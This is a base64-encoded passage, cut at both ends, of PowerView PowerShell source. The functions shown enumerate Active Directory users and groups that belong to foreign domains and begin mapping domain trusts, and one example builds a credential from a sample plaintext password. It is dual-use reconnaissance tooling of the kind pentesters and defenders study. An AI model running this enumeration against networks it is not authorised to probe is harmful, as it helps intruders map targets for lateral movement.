pXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJyhtZW1iZXJvZj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1JhdyddID0gJFJhdyB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gR2V0LURvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkRW52OlVTRVJETlNET01BSU4pIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRFbnY6VVNFUkROU0RPTUFJTgogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgdGhyb3cgIltHZXQtRG9tYWluRm9yZWlnblVzZXJdIE5vIGRvbWFpbiBmb3VuZCB0byBlbnVtZXJhdGUhIgogICAgICAgIH0KCiAgICAgICAgR2V0LURvbWFpblVzZXIgQFNlYXJjaGVyQXJndW1lbnRzICB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlcnNoaXAgaW4gJF8ubWVtYmVyb2YpIHsKICAgICAgICAgICAgICAgICRJbmRleCA9ICRNZW1iZXJzaGlwLkluZGV4T2YoJ0RDPScpCiAgICAgICAgICAgICAgICBpZiAoJEluZGV4KSB7CgogICAgICAgICAgICAgICAgICAgICRHcm91cERvbWFpbiA9ICQoJE1lbWJlcnNoaXAuU3ViU3RyaW5nKCRJbmRleCkpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKCiAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cERvbWFpbiAtbmUgJFRhcmdldERvbWFpbikgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSBncm91cCBkb21haW4gZG9lc24ndCBtYXRjaCB0aGUgdXNlciBkb21haW4sIGRpc3BsYXkgaXQKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRNZW1iZXJzaGlwLlNwbGl0KCcsJylbMF0uc3BsaXQoJz0nKVsxXQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyRG9tYWluJyAkVGFyZ2V0RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJF8uc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJEaXN0aW5ndWlzaGVkTmFtZScgJF8uZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRG9tYWluJyAkR3JvdXBEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEaXN0aW5ndWlzaGVkTmFtZScgJE1lbWJlcnNoaXAKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Gb3JlaWduVXNlcicpCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Gb3JlaWduR3JvdXBNZW1iZXIgewo8IwouU1lOT1BTSVMKCkVudW1lcmF0ZXMgZ3JvdXBzIHdpdGggdXNlcnMgb3V0c2lkZSBvZiB0aGUgZ3JvdXAncyBkb21haW4gYW5kIHJldHVybnMKZWFjaCBmb3JlaWduIG1lbWJlci4gVGhpcyBpcyBhIGRvbWFpbidzICJpbmNvbWluZyIgYWNjZXNzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluLCBHZXQtRG9tYWluR3JvdXAgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIEdldC1Eb21haW5Hcm91cCB0byBlbnVtZXJhdGUgYWxsIGdyb3VwcyBmb3IgdGhlIGN1cnJlbnQgKG9yIHRhcmdldCkgZG9tYWluLAp0aGVuIGVudW1lcmF0ZXMgdGhlIG1lbWJlcnMgb2YgZWFjaCBncm91cCwgYW5kIGNvbXBhcmVzIHRoZSBtZW1iZXIncyBkb21haW4KbmFtZSB0byB0aGUgcGFyZW50IGdyb3VwJ3MgZG9tYWluIG5hbWUsIG91dHB1dHRpbmcgdGhlIG1lbWJlciBpZiB0aGUgZG9tYWlucyBkaWZmZXIuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBTZWN1cml0eU1hc2tzCgpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2VjdXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0LgpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkZvcmVpZ25Hcm91cE1lbWJlcgoKUmV0dXJuIGFsbCBncm91cCBtZW1iZXJzIGluIHRoZSBjdXJyZW50IGRvbWFpbiB3aGVyZSB0aGUgZ3JvdXAgYW5kIG1lbWJlciBkaWZmZXIuCgouRVhBTVBMRQoKR2V0LURvbWFpbkZvcmVpZ25Hcm91cE1lbWJlciAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpSZXR1cm4gYWxsIGdyb3VwIG1lbWJlcnMgaW4gdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbiB3aGVyZSB0aGUgbWVtYmVyIGlzIG5vdCBpbiBkZXYudGVzdGxhYi5sb2NhbC4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwgLVNlcnZlciBzZWNvbmRhcnkuZGV2LnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKClJldHVybiBhbGwgZ3JvdXAgbWVtYmVycyBpbiB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluIHdoZXJlIHRoZSBtZW1iZXIgaXMKbm90IGluIGRldi50ZXN0bGFiLmxvY2FsLiBiaW5kaW5nIHRvIHRoZSBzZWNvbmRhcnkuZGV2LnRlc3RsYWIubG9jYWwgZm9yCnF1ZXJpZXMsIGFuZCB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuRm9yZWlnbkdyb3VwTWVtYmVyCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGdyb3VwIG1lbWJlciBwcm9wZXJ0eSBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRm9yZWlnbkdyb3VwTWVtYmVyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKG1lbWJlcj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1JhdyddID0gJFJhdyB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gR2V0LURvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkRW52OlVTRVJETlNET01BSU4pIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRFbnY6VVNFUkROU0RPTUFJTgogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgdGhyb3cgIltHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyXSBObyBkb21haW4gZm91bmQgdG8gZW51bWVyYXRlISIKICAgICAgICB9CgogICAgICAgICMgc3RhbmRhcmQgZ3JvdXAgbmFtZXMgdG8gaWdub3JlCiAgICAgICAgJEV4Y2x1ZGVHcm91cHMgPSBAKCdVc2VycycsICdEb21haW4gVXNlcnMnLCAnR3Vlc3RzJykKICAgICAgICAkRG9tYWluRE4gPSAiREM9JCgkVGFyZ2V0RG9tYWluLlJlcGxhY2UoJy4nLCAnLERDPScpKSIKCiAgICAgICAgR2V0LURvbWFpbkdyb3VwIEBTZWFyY2hlckFyZ3VtZW50cyB8IFdoZXJlLU9iamVjdCB7JEV4Y2x1ZGVHcm91cHMgLW5vdGNvbnRhaW5zICRfLnNhbWFjY291bnRuYW1lfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRfLnNhbUFjY291bnROYW1lCiAgICAgICAgICAgICRHcm91cERpc3Rpbmd1aXNoZWROYW1lID0gJF8uZGlzdGluZ3Vpc2hlZG5hbWUKCiAgICAgICAgICAgICRfLm1lbWJlciB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgZmlsdGVyIGZvciBmb3JlaWduIFNJRHMgaW4gdGhlIGNuIGZpZWxkIGZvciB1c2VycyBpbiBhbm90aGVyIGRvbWFpbiwKICAgICAgICAgICAgICAgICMgICBvciBpZiB0aGUgRE4gZG9lc24ndCBlbmQgd2l0aCB0aGUgcHJvcGVyIEROIGZvciB0aGUgcXVlcmllZCBkb21haW4KICAgICAgICAgICAgICAgIGlmICgoJF8gLW1hdGNoICdDTj1TLTEtNS0yMS4qLS4qJykgLW9yICgkRG9tYWluRE4gLW5lICgkXy5TdWJTdHJpbmcoJF8uSW5kZXhPZignREM9JykpKSkpIHsKCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRpc3Rpbmd1aXNoZWROYW1lID0gJF8KICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJF8uU3ViU3RyaW5nKCRfLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkXy5TcGxpdCgnLCcpWzBdLnNwbGl0KCc9JylbMV0KCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRG9tYWluJyAkVGFyZ2V0RG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRGlzdGluZ3Vpc2hlZE5hbWUnICRHcm91cERpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJEb21haW4nICRNZW1iZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck5hbWUnICRNZW1iZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScgJE1lbWJlckRpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRm9yZWlnbkdyb3VwTWVtYmVyJykKICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluVHJ1c3RNYXBwaW5nIHsKPCMKLlNZTk9QU0lTCgpUaGlzIGZ1bmN0aW9uIGVudW1lcmF0ZXMgYWxsIHRydXN0cyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluIGFuZCB0aGVuIGVudW1lcmF0ZXMKYWxsIHRydXN0cyBmb3IgZWFjaCBkb21haW4gaXQgZmluZHMuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW4sIEdldC1Eb21haW5UcnVzdCwgR2V0LUZvcmVzdFRydXN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIGVudW1lcmF0ZSBkb21haW4gdHJ1c3QgcmVsYXRpb25zaGlwcyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluIHVzaW5nCmEgbnVtYmVyIG9mIG1ldGhvZHMsIGFuZCB0aGVuIGVudW1lcmF0ZXMgYWxsIHRydXN0cyBmb3IgZWFjaCBmb3VuZCBkb21haW4sIHJlY3Vyc2l2ZWx5Cm1hcHBpbmcgYWxsIHJlYWNoYWJsZSB0cnVzdCByZWxhdGlvbnNoaXBzLiBCeSBkZWZhdWx0LCB0aGUgLk5FVCBtZXRob2QgR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkKaXMgdXNlZCBvbiB0aGUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW4gb2JqZWN0LiBJZiB0aGUgLUxEQVAgZmxhZwppcyBzcGVjaWZpZWQsIG9yIGFueSBvZiB0aGUgTERBUC1hcHByb3ByaWF0ZSBwYXJhbWV0ZXJzLCBhbiBMREFQIHNlYXJjaCB1c2luZyB0aGUgZmlsdGVyCicob2JqZWN0Q2xhc3M9dH